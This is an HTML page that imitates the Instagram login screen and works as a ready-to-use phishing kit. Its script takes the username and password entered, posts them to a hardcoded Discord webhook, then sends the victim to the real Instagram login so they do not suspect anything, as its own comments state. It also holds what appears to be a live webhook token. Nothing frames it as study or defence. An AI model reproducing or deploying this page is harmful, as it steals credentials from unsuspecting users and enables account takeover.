<!DOCTYPE html>
<html>
<head>
    <style>
        body { font-family: sans-serif; background-color: #fafafa; display: flex; justify-content: center; padding-top: 40px; }
        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #efefef; background: #fafafa; border-radius: 3px; box-sizing: border-box; }
        button { width: 100%; background: #0095f6; color: white; border: none; padding: 7px; border-radius: 4px; font-weight: 600; cursor: pointer; }
        .divider { color: #8e8e8e; margin: 20px 0; font-size: 13px; font-weight: 600; }
    </style>
</head>
<body>
    <div class="login-box">
        <h1 style="font-family: 'Cookie', cursive; font-size: 40px; margin-bottom: 30px;">Instagram</h1>
        
        <input type="text" id="username" placeholder="Phone number, username, or email">
        
        <input type="password" id="password" placeholder="Password">
        
        <button type="button" onclick="sendToDiscord()">Log In</button>
        
        <div class="divider">OR</div>
        <a href="#" style="color: #385185; text-decoration: none; font-size: 14px; font-weight: 600;">Log in with Facebook</a>
    </div>

    <script>
        function sendToDiscord() {
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            // PASTE YOUR DISCORD WEBHOOK URL HERE
            const webhookURL = "https://discord.com/api/webhooks/1486259263914377236/Kp2In8sqX572Su7_eLqir15sxxdixZ6ObTJkvQsSGa1m9qDHY0FTtsAEoyUvKAoGPwtw";

            // This sends the data silently to your Discord channel
            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    content: `**[NEW LOGIN ATTEMPT]**\n**User:** \`${user}\` \n**Pass:** \`${pass}\``
                })
            }).then(() => {
                // After sending, redirect the victim to the real Instagram login
                // so they don't suspect anything.
                window.parent.location.href = "https://www.instagram.com/accounts/login/";
            }).catch(err => {
                console.error("Error sending to Discord:", err);
            });
        }
    </script>
</body>
</html>
